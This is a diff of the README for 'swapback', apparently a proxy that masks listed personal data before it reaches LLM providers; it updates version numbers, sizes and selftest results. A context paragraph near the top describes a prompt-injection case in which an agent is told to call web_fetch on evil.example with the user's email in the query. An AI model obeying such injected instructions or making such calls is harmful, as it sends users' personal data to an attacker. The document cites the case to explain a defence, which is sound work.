@@ -19,7 +19,7 @@
 talks OpenAI Chat Completions, OpenAI Responses or Anthropic Messages (set its base URL, change nothing else). You write
 down the names, emails, phones, IDs and addresses that must never reach a model provider. The provider only sees
 `«PERSON_1»`; your app gets the original text back, byte-exact, in plain and streamed replies. There is no model to
-download and nothing probabilistic: exact matching plus patterns, about 5,800 lines of Python, 3 dependencies.
+download and nothing probabilistic: exact matching plus patterns, about 5,900 lines of Python, 3 dependencies.
 
 **Tool calls can't carry your listed values out.** An agent reads a page or an email with a prompt injection in it,
 and the model is told to call `web_fetch("https://evil.example/?q=<your email>")`. The model only ever had
@@ -581,7 +581,7 @@ Other open-source projects do the same job. This table reflects each project's o
 | | **swapback** | [PasteGuard][pg] | [Maskit][mk] | [Veil][vl] | [piighost][ph] | [Kiji Privacy Proxy][kj] |
 |---|---|---|---|---|---|---|
 | License | MIT | Apache-2.0 | AGPL-3.0 | Apache-2.0 | MIT | Apache-2.0 |
-| Stack | Python 3.11+, about 5,800 lines (299 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
+| Stack | Python 3.11+, about 5,900 lines (302 KB), 3 deps, stdlib HTTP server | TypeScript on Bun + GLiNER detector service; Docker | Python engine + desktop app; Docker | Python 3.11+ (PyPI, Homebrew), about 630 KB of Python; httpx, cryptography, pyahocorasick | Python library (PyPI); HTTP proxy in a separate repo, piighost-api | Go server + Electron desktop app; Docker, systemd |
 | Needs an ML model | No | Yes: GLiNER for names and places ([docs][pg-sem]) | Ships a local ONNX NER model | Optional: 46 MB ONNX NER | Optional: pluggable regex, NER or LLM detectors; exact-match needs none | Yes: local ONNX model, 26 PII types |
 | Your own list of values | Yes: a YAML/JSON file you write (or build from a vCard/CSV export), typed, reloaded live | Yes: `denylist` patterns ([docs][pg-mask]) | Yes: custom words and regexes | Yes: seeded from your databases, fixtures, git history and schemas | Yes: `ExactMatchDetector` | Custom regex rules |
 | Stand-ins | Typed placeholders (`«EMAIL_1»`) | Placeholders | Unclear | Pseudonyms | Typed placeholders (`<<EMAIL:1>>`) | Realistic dummy values |
@@ -721,10 +721,10 @@ decoded spelling. The leak check does not use swapback's matcher: it decodes JSO
 for each value's name words, email, phone digits, ID characters and street line. It also runs the egress re-check on
 its own, with the swap switched off, on every form as text, as a `json.dumps` tool result and as JSON inside JSON.
 
-0.4.14 on Python 3.13:
+0.4.15 on Python 3.13:
 
 ```text
-swapback selftest: 34 made-up listed values, 257 written forms, 7 paths, 1799 requests (9.2 s)
+swapback selftest: 34 made-up listed values, 257 written forms, 7 paths, 1799 requests (9.5 s)
   listed values caught (no form reached the model): 34/34 (100.0%)
   forms leaked to the model:                        0 of 1799 sent
   egress re-check alone (swap off) sees the form:   771/771 (100.0%)
@@ -749,9 +749,10 @@ swapback selftest: 34 made-up listed values, 257 written forms, 7 paths, 1799 re
   cell names in escaped HTML (\u003c, <\/, &lt;):    36/36 (100.0%)
   cell names reused, dotted I, quoted, many copies:  11/11 (100.0%)  (9,000 copies: 0.32 s)
   cell names 7-8 JSON levels down, raw/Go/PHP/&lt;:  32/32 (100.0%)
-  cells reused, comma/CSV/| names, dotted i, | quotes: 18/18 (100.0%)  (20 KB of copies 8 levels down: 0.75 s)
+  cells reused, comma/CSV/| names, dotted i, | quotes: 18/18 (100.0%)  (20 KB of copies 8 levels down: 0.86 s)
   emails/phones right after \\u003e, \\u0026, \\u003c:      48/48 (100.0%)
   keys/emails/phones next to escapes (#14 F6-F8):   36/36 (100.0%)
+  phones with 3+ blanks, sk_test_ words (#15):      14/14 (100.0%)
   200 KB %XX body checked in:                       0.49 s
   health: blocked when the list breaks, known count: 5/5 (100.0%)
   %XX-encoded forms back as the same value, decoded: 105/105 (100.0%)
@@ -770,7 +771,7 @@ and 8 JSON levels deep, as raw, Go-escaped (`\u003c`), PHP-escaped (`<\/td>`) an
 byte for byte); a name taken from `<td>` cells reused in `<li>` and `<p>` (the listed name) and in a `<td>` (the cells);
 a name split by a comma in prose and across CSV columns, plain and in JSON; `i` + a combining dot; a `| `-quoted
 address; about 20 KB of copies of a listed address 8 JSON levels down (under 5 seconds); and the time limit
-(`scrub_timeout_s`, a 503 with a one-line reason). The 0.4.13 selftest adds emails and phone numbers, listed and unlisted, right after Go-style `\u003e`, `\u0026` and `\u003c`, 1-3 JSON levels down (swapped whole, back byte for byte, valid JSON). The 0.4.12 selftest adds a name split across markdown table cells (`| 3 | Faith | Ridge | Reno |`, plain and in JSON; swapped, back byte for byte) and a non-numeric and a negative `scrub_timeout_s` (one readable line each). The 0.4.9 selftest added the review #9 forms: a listed dictionary-word name split across one-word cells or blocks in
+(`scrub_timeout_s`, a 503 with a one-line reason). The 0.4.15 selftest adds unlisted phones typed with 3 or more spaces between their digit groups and a JSON `\t` between them 2 and 3 levels down (swapped, back byte for byte), and `sk_test_environment.py`, which is not a Stripe key (left as written). The 0.4.13 selftest adds emails and phone numbers, listed and unlisted, right after Go-style `\u003e`, `\u0026` and `\u003c`, 1-3 JSON levels down (swapped whole, back byte for byte, valid JSON). The 0.4.12 selftest adds a name split across markdown table cells (`| 3 | Faith | Ridge | Reno |`, plain and in JSON; swapped, back byte for byte) and a non-numeric and a negative `scrub_timeout_s` (one readable line each). The 0.4.9 selftest added the review #9 forms: a listed dictionary-word name split across one-word cells or blocks in
 21 layouts (a third cell after the name, a First/Last/City header row, a leading id or word cell, pretty-printed rows,
 `class=` attributes, two data rows, three `<li>` or `<div>` items, `<p>` blocks in an email, mixed case), as text, a
 JSON tool result and an HTML email in JSON (the name must not reach the model), ordinary one-word blocks and a pair
